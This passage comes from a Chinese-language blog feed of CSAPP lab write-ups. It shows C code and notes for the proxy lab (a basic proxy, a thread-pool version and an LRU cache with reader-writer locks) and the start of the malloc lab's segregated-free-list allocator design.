class="hljs-built_in">sprintf</span>(req_server, <span class="hljs-string">&quot;GET %s HTTP/1.0\r\n&quot;</span>, req_uri-&gt;path);<br>  <span class="hljs-built_in">sprintf</span>(req_server, <span class="hljs-string">&quot;%sHost: %s\r\n&quot;</span>, req_server, req_uri-&gt;host);<br>  <span class="hljs-built_in">sprintf</span>(req_server, <span class="hljs-string">&quot;%s%s&quot;</span>, req_server, user_agent_hdr);<br>  <span class="hljs-built_in">sprintf</span>(req_server, <span class="hljs-string">&quot;%sConnection: close\r\n&quot;</span>, req_server);<br>  <span class="hljs-built_in">sprintf</span>(req_server, <span class="hljs-string">&quot;%sProxy-Connection: close\r\n&quot;</span>, req_server);<br>  <span class="hljs-built_in">sprintf</span>(req_server, <span class="hljs-string">&quot;%s\r\n&quot;</span>, req_server);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">doit</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span> </span>&#123;<br>  <span class="hljs-comment">// 初始化rio类函数的缓冲区</span><br>  <span class="hljs-type">rio_t</span> rio;<br>  <span class="hljs-built_in">Rio_readinitb</span>(&amp;rio, fd);<br>  <span class="hljs-comment">// 读入这一行http请求</span><br>  <span class="hljs-type">char</span> buf[MAXLINE];<br>  <span class="hljs-built_in">Rio_readlineb</span>(&amp;rio, buf, MAXLINE);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Request headers:\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, buf);<br>  <span class="hljs-type">char</span> method[MAXLINE], uri[MAXLINE], version[MAXLINE];<br>  <span class="hljs-comment">// 解析这一行http请求，总共三个部分</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf, <span class="hljs-string">&quot;%s %s %s&quot;</span>, method, uri, version) != <span class="hljs-number">3</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;HTTP Requset Format Wrong!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-comment">// 判断是否是GET请求，这个比较函数忽略大小写，get也行</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcasecmp</span>(method, <span class="hljs-string">&quot;GET&quot;</span>)) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;method: %s not implemented\n&quot;</span>, method);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-comment">// 至此，已经完成了对客户端请求的解析，接下来要构造出对服务器的请求</span><br>  <span class="hljs-comment">// 首先解析我们的uri，得到host port path</span><br>  URI *req_uri = (URI *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(URI));<br>  <span class="hljs-built_in">parse_line</span>(req_uri, uri);<br>  <span class="hljs-comment">// 根据我们的信息，构造出真正的发往服务器的请求</span><br>  <span class="hljs-type">char</span> req_server[MAXLINE];<br>  <span class="hljs-built_in">build_req_server</span>(req_server, req_uri);<br>  <span class="hljs-comment">// 开始连接服务器</span><br>  <span class="hljs-type">int</span> server_fd = <span class="hljs-built_in">Open_clientfd</span>(req_uri-&gt;host, req_uri-&gt;port);<br>  <span class="hljs-keyword">if</span> (server_fd &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;connection failed\n&quot;</span>);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-comment">// 连接成功，设置缓冲区，将request写入</span><br>  <span class="hljs-type">rio_t</span> server_rio;<br>  <span class="hljs-built_in">Rio_readinitb</span>(&amp;server_rio, server_fd);<br>  <span class="hljs-built_in">Rio_writen</span>(server_fd, req_server, <span class="hljs-built_in">strlen</span>(req_server));<br>  <span class="hljs-comment">// 等待服务器的返回，并写入客户端的fd中</span><br>  <span class="hljs-type">size_t</span> rec_bytes;<br>  <span class="hljs-keyword">while</span> ((rec_bytes = <span class="hljs-built_in">Rio_readlineb</span>(&amp;server_rio, buf, MAXLINE)) != <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;proxy received %d bytes\n&quot;</span>, (<span class="hljs-type">int</span>)rec_bytes);<br>    <span class="hljs-built_in">Rio_writen</span>(fd, buf, rec_bytes);<br>  &#125;<br>  <span class="hljs-built_in">Close</span>(server_fd);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> </span>&#123;<br><br>  <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-comment">// 监听请求连接的端口</span><br>  <span class="hljs-type">int</span> listenfd = <span class="hljs-built_in">Open_listenfd</span>(argv[<span class="hljs-number">1</span>]);<br>  <span class="hljs-comment">// 与客户端进行连接</span><br>  <span class="hljs-type">int</span> connfd;<br>  <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>  <span class="hljs-type">socklen_t</span> clientlen;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_storage</span> clientaddr;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    clientlen = <span class="hljs-built_in">sizeof</span>(clientaddr);<br>    connfd = <span class="hljs-built_in">Accept</span>(listenfd, (SA *)(&amp;clientaddr), &amp;clientlen);<br>    <span class="hljs-built_in">Getnameinfo</span>((SA *)(&amp;clientaddr), clientlen, hostname, MAXLINE, port,<br>                MAXLINE, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepted connection from(%s,%s)\n&quot;</span>, hostname, port);<br>    <span class="hljs-built_in">doit</span>(connfd);<br>    <span class="hljs-built_in">Close</span>(connfd);<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol><h1 id="第二部分：并发"><a href="#第二部分：并发" class="headerlink" title="第二部分：并发"></a>第二部分：并发</h1><h2 id="任务要求-1"><a href="#任务要求-1" class="headerlink" title="任务要求"></a>任务要求</h2><ol><li>实现并发即可，没有要求用什么样的方式</li></ol><h2 id="具体实现-1"><a href="#具体实现-1" class="headerlink" title="具体实现"></a>具体实现</h2><ol><li>采用生产者消费者的方式，和书上第<code>12.5.5</code>节的代码几乎完全一样</li><li>需要在main函数中加入一个<code>Signal(SIGPIPE, SIG_IGN);</code>以屏蔽<code>SIGPIPE信号</code>。我不太清楚不屏蔽会怎么样，可能是不屏蔽的话，客户端如果意外挂了，会导致代理服务器一起挂了<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SUBFSIZE 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NTHREADS 4</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>  <span class="hljs-type">int</span> *buf;<br>  <span class="hljs-type">int</span> n;<br>  <span class="hljs-type">int</span> front;<br>  <span class="hljs-type">int</span> rear;<br>  <span class="hljs-type">sem_t</span> mutex;<br>  <span class="hljs-type">sem_t</span> slots;<br>  <span class="hljs-type">sem_t</span> items;<br>&#125; <span class="hljs-type">sbuf_t</span>;<br><br><span class="hljs-type">sbuf_t</span> sbuf;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sbuf_init</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>  sp-&gt;buf = <span class="hljs-built_in">Calloc</span>(n, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">int</span>));<br>  sp-&gt;n = n;<br>  sp-&gt;front = sp-&gt;rear = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">Sem_init</span>(&amp;sp-&gt;mutex, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>  <span class="hljs-built_in">Sem_init</span>(&amp;sp-&gt;slots, <span class="hljs-number">0</span>, n);<br>  <span class="hljs-built_in">Sem_init</span>(&amp;sp-&gt;items, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sbuf_deinit</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp)</span> </span>&#123; <span class="hljs-built_in">Free</span>(sp-&gt;buf); &#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sbuf_insert</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp, <span class="hljs-type">int</span> item)</span> </span>&#123;<br>  <span class="hljs-built_in">P</span>(&amp;sp-&gt;slots);<br>  <span class="hljs-built_in">P</span>(&amp;sp-&gt;mutex);<br>  sp-&gt;buf[(++sp-&gt;rear) % (sp-&gt;n)] = item;<br>  <span class="hljs-built_in">V</span>(&amp;sp-&gt;mutex);<br>  <span class="hljs-built_in">V</span>(&amp;sp-&gt;items);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sbuf_remove</span><span class="hljs-params">(<span class="hljs-type">sbuf_t</span> *sp)</span> </span>&#123;<br>  <span class="hljs-built_in">P</span>(&amp;sp-&gt;items);<br>  <span class="hljs-built_in">P</span>(&amp;sp-&gt;mutex);<br>  <span class="hljs-type">int</span> item = sp-&gt;buf[(++sp-&gt;front) % (sp-&gt;n)];<br>  <span class="hljs-built_in">V</span>(&amp;sp-&gt;mutex);<br>  <span class="hljs-built_in">V</span>(&amp;sp-&gt;slots);<br>  <span class="hljs-keyword">return</span> item;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *vargp)</span> </span>&#123;<br>  <span class="hljs-built_in">Pthread_detach</span>(<span class="hljs-built_in">Pthread_self</span>());<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-type">int</span> connfd = <span class="hljs-built_in">sbuf_remove</span>(&amp;sbuf);<br>    <span class="hljs-built_in">doit</span>(connfd);<br>    <span class="hljs-built_in">Close</span>(connfd);<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> </span>&#123;<br><br>  <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-comment">// 监听请求连接的端口</span><br>  <span class="hljs-built_in">Signal</span>(SIGPIPE, SIG_IGN);<br>  <span class="hljs-type">int</span> listenfd = <span class="hljs-built_in">Open_listenfd</span>(argv[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">// 线程池</span><br>  <span class="hljs-built_in">sbuf_init</span>(&amp;sbuf, SUBFSIZE);<br>  <span class="hljs-type">pthread_t</span> pid;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NTHREADS; i++) &#123;<br>    <span class="hljs-built_in">Pthread_create</span>(&amp;pid, <span class="hljs-literal">NULL</span>, thread, <span class="hljs-literal">NULL</span>);<br>  &#125;<br><br>  <span class="hljs-comment">// 与客户端进行连接</span><br>  <span class="hljs-type">int</span> connfd;<br>  <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>  <span class="hljs-type">socklen_t</span> clientlen;<br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_storage</span> clientaddr;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>    clientlen = <span class="hljs-built_in">sizeof</span>(clientaddr);<br>    connfd = <span class="hljs-built_in">Accept</span>(listenfd, (SA *)(&amp;clientaddr), &amp;clientlen);<br>    <span class="hljs-built_in">sbuf_insert</span>(&amp;sbuf, connfd);<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="第三部分：cache"><a href="#第三部分：cache" class="headerlink" title="第三部分：cache"></a>第三部分：cache</h1><h2 id="任务要求-2"><a href="#任务要求-2" class="headerlink" title="任务要求"></a>任务要求</h2><ol><li>这里说是cache，还不如说是一个大号的哈希表，以uri为键，以对应的资源为值。然后对这个哈希表的长度有点要求，大概10个表项。因为题目要求<code>#define MAX_CACHE_SIZE 1049000</code>，<code>#define MAX_OBJECT_SIZE 102400</code>，其中object的意思就是一行，差不多就是十倍的样子</li><li>如果某个uri对应的资源太大了， 那就不考虑加入cache</li><li>对这个cahce需要实现并发访问，即加上锁，这里加入读写锁</li></ol><h2 id="具体实现-2"><a href="#具体实现-2" class="headerlink" title="具体实现"></a>具体实现</h2><ol><li>结合cachelab中cache的结构，还需要额外加上data字段</li><li>如果要实现真正的LRU，在并发访问的基础上，还需要对timestamp也加锁，否则就要用原子类型的变量</li><li>这个实现结合代码来看，思路还是比较清晰的，不再赘述<br>我在这里犯了两个小错，结果导致debug了好久</li><li><code>cacheline</code>中的<code>tag</code>和<code>data</code>的长度是不一样的，我一开始把<code>data</code>长度弄成了<code>MAXLINE</code>，结果0分</li><li>在<code>doit</code>中我们用<code>uri</code>去读<code>cache</code>以及写<code>cache</code>，但是我们在<code>doit</code>的<code>parse_line</code>函数里，是修改了<code>uri</code>的，因此要给<code>uri</code>搞一个备份，否则在写cache的时候，就错了<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* Recommended max cache and object sizes */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_CACHE_SIZE 1049000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_OBJECT_SIZE 102400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXLINE 8192</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>  <span class="hljs-type">int</span> is_valid;<br>  <span class="hljs-type">char</span> tag[MAXLINE];<br>  <span class="hljs-type">char</span> data[MAX_OBJECT_SIZE];<br>  <span class="hljs-type">long</span> <span class="hljs-type">long</span> access_time;<br>  <span class="hljs-type">int</span> read_cnt;<br>  <span class="hljs-type">sem_t</span> read_lock;<br>  <span class="hljs-type">sem_t</span> write_lock;<br>&#125; cacheline;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_CACHE_LINES 10</span><br>cacheline Cache[MAX_CACHE_LINES];<br><br><span class="hljs-type">sem_t</span> time_mutex;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> time_stamp = <span class="hljs-number">1</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_cache</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE_LINES; i++) &#123;<br>    Cache[i].is_valid = <span class="hljs-number">0</span>;<br>    Cache[i].access_time = <span class="hljs-number">0</span>;<br>    Cache[i].read_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">Sem_init</span>(&amp;Cache[i].read_lock, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">Sem_init</span>(&amp;Cache[i].write_lock, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-built_in">Sem_init</span>(&amp;time_mutex, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">read_in</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> </span>&#123;<br>  <span class="hljs-built_in">P</span>(&amp;Cache[i].read_lock);<br>  <span class="hljs-keyword">if</span> (Cache[i].read_cnt == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">P</span>(&amp;Cache[i].write_lock);<br>  &#125;<br>  Cache[i].read_cnt++;<br>  <span class="hljs-built_in">V</span>(&amp;Cache[i].read_lock);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">read_out</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> </span>&#123;<br>  <span class="hljs-built_in">P</span>(&amp;Cache[i].read_lock);<br>  <span class="hljs-keyword">if</span> (Cache[i].read_cnt == <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-built_in">V</span>(&amp;Cache[i].write_lock);<br>  &#125;<br>  Cache[i].read_cnt--;<br>  <span class="hljs-built_in">V</span>(&amp;Cache[i].read_lock);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">read_cache</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *uri)</span> </span>&#123;<br>  <span class="hljs-type">int</span> flag = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE_LINES; i++) &#123;<br>    <span class="hljs-built_in">read_in</span>(i);<br>    <span class="hljs-keyword">if</span> (Cache[i].is_valid &amp;&amp; !<span class="hljs-built_in">strcmp</span>(uri, Cache[i].tag)) &#123;<br>      flag = <span class="hljs-number">1</span>;<br>      <span class="hljs-built_in">P</span>(&amp;time_mutex);<br>      Cache[i].access_time = time_stamp++;<br>      <span class="hljs-built_in">V</span>(&amp;time_mutex);<br>      <span class="hljs-built_in">Rio_writen</span>(fd, Cache[i].data, <span class="hljs-built_in">strlen</span>(Cache[i].data));<br>    &#125;<br>    <span class="hljs-built_in">read_out</span>(i);<br>    <span class="hljs-keyword">if</span> (flag) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">write_cache</span><span class="hljs-params">(<span class="hljs-type">char</span> *uri, <span class="hljs-type">char</span> *data)</span> </span>&#123;<br>  <span class="hljs-type">int</span> has_empty = <span class="hljs-number">-1</span>;<br>  <span class="hljs-type">int</span> lru_evict = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE_LINES; i++) &#123;<br>    <span class="hljs-built_in">read_in</span>(i);<br>    <span class="hljs-keyword">if</span> (Cache[i].is_valid == <span class="hljs-number">0</span>) &#123;<br>      has_empty = i;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (Cache[i].access_time &lt; Cache[lru_evict].access_time) &#123;<br>      lru_evict = i;<br>    &#125;<br>    <span class="hljs-built_in">read_out</span>(i);<br>    <span class="hljs-keyword">if</span> (has_empty != <span class="hljs-number">-1</span>) &#123;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-type">int</span> write_index = (has_empty == <span class="hljs-number">-1</span>) ? lru_evict : has_empty;<br>  <span class="hljs-built_in">P</span>(&amp;Cache[write_index].write_lock);<br>  Cache[write_index].is_valid = <span class="hljs-number">1</span>;<br>  <span class="hljs-built_in">P</span>(&amp;time_mutex);<br>  Cache[write_index].access_time = time_stamp++;<br>  <span class="hljs-built_in">V</span>(&amp;time_mutex);<br>  <span class="hljs-built_in">strcpy</span>(Cache[write_index].tag, uri);<br>  <span class="hljs-built_in">strcpy</span>(Cache[write_index].data, data);<br>  <span class="hljs-built_in">V</span>(&amp;Cache[write_index].write_lock);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp_lab6</title>
    <link href="/2023/08/06/csapp-lab6/"/>
    <url>/2023/08/06/csapp-lab6/</url>
    
    <content type="html"><![CDATA[<p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224203033.png" alt="20231224203033"></p><p>前情提要</p><ol><li>一定要把书中关于隐式空闲链表的实现代码好好看一下， 这个lab的代码和那个非常像</li></ol><h1 id="实验文档"><a href="#实验文档" class="headerlink" title="实验文档"></a>实验文档</h1><ol><li>只需要修改<code>mm.c</code>文件</li><li><code>mdriver.c</code>可以用来衡量性能<ol><li><code>make</code></li><li><code>./mdriver -V</code></li></ol></li><li>需要完成的函数<ol><li><code>int mm_init(void)</code><ol><li>最开始的时候调用</li><li>失败时返回-1，成功时返回0</li></ol></li><li><code>void *mm_malloc(size_t size)</code><ol><li>返回堆上的一个地址</li><li>至少包含size字节</li><li>向8字节对齐</li></ol></li><li><code>void mm_free(void *ptr)</code><ol><li>这个地址是通过malloc或者realloc分配的</li><li>这个地址还没有被free</li></ol></li><li><code>void *mm_realloc(void *ptr, size_t size)</code><ol><li>如果ptr是null，则相当于调用malloc</li><li>如果size是0，相当于调用free</li><li>新的地址开始的内容需要和原来一样，但是大小由size决定</li></ol></li></ol></li><li>可以调用的函数<ol><li><code>void *mem sbrk(int incr)</code><ol><li>为堆开辟内存空间</li><li>返回新开辟的内存的起始地址</li></ol></li><li><code>void *mem heap lo(void)</code>：返回堆的起始位置</li><li><code>void *mem heap hi(void)</code>：返回堆的终止位置</li><li><code>size t mem heapsize(void)</code>返回堆的大小</li><li><code>size t mem pagesize(void)</code>返回内存页面的大小</li></ol></li><li>测试<ol><li>.&#x2F;mdriver -t traces&#x2F; -v</li></ol></li></ol><h1 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h1><ol><li>模型选择书中的第603页的显示空闲链表<ol><li>首部和尾部相同，记录$size | alloc$</li><li>首部后面紧跟着两个指针，分别是pre和next，这两个指针指向前后的空闲块。（其实我这里有个疑惑，按理说我们操作的地址都是64位的，怎么可以用一块表示一个地址，一块明明才32位）</li></ol></li><li>空闲链表的管理采用书中9.9.14节介绍的方法<ol><li>将空闲块按大小划分为16类，分别是大小为$1,2-3,4-7,8-15$等等，最后一块记录的是$2^{15}-无穷$。每一类都维护一个链表，链表从小到大地记录着当前存在且位于这一类大小范围内的空闲块的bp指针。</li><li>查找的方法类似于二分查找，找到大于等于当前块的类，然后从这个类开始找，如果找不到合适的块，就往下一类找。如果实在找不到，就要去扩展堆的大小了</li></ol></li></ol><h1 id="mm-init"><a href="#mm-init" class="headerlink" title="mm_init"></a>mm_init</h1><p><code>int mm_init(void)</code><br>这个函数是用来初始化我们的堆，</p><ol><li>初始化空闲块数组</li><li>初始化原始的堆<ol><li>申请4个块（16个字节），和书中的隐式链表一样</li><li>分别为这4个块设置size和alloc</li></ol></li><li>申请扩展堆<ol><li>（构建初始的空闲块）</li><li>这里使用一个函数实现，因为后续还会使用到扩展堆这个操作<br>具体实现如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">mm_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>  <span class="hljs-comment">// 初始化记录空闲块的数组</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; LIST_MAX_SIZE; i++) &#123;<br>    segregated_free_lists[i] = <span class="hljs-literal">NULL</span>;<br>  &#125;<br>  <span class="hljs-comment">// 先请求空间来初始化堆的结构</span><br>  <span class="hljs-type">void</span> *heap_listp;<br>  <span class="hljs-keyword">if</span> ((heap_listp = mem_sbrk(<span class="hljs-number">4</span> * WSIZE)) == (<span class="hljs-type">void</span> *)(<span class="hljs-number">-1</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  PUT(heap_listp, <span class="hljs-number">0</span>);<br>  PUT(heap_listp + (<span class="hljs-number">1</span> * WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>));<br>  PUT(heap_listp + (<span class="hljs-number">2</span> * WSIZE), PACK(DSIZE, <span class="hljs-number">1</span>));<br>  PUT(heap_listp + (<span class="hljs-number">3</span> * WSIZE), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));<br>  <span class="hljs-comment">// 为堆申请一个chunksize的虚存空间</span><br>  <span class="hljs-keyword">if</span> (extend_heap(CHUNKSIZE) == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h1 id="extend-heap"><a href="#extend-heap" class="headerlink" 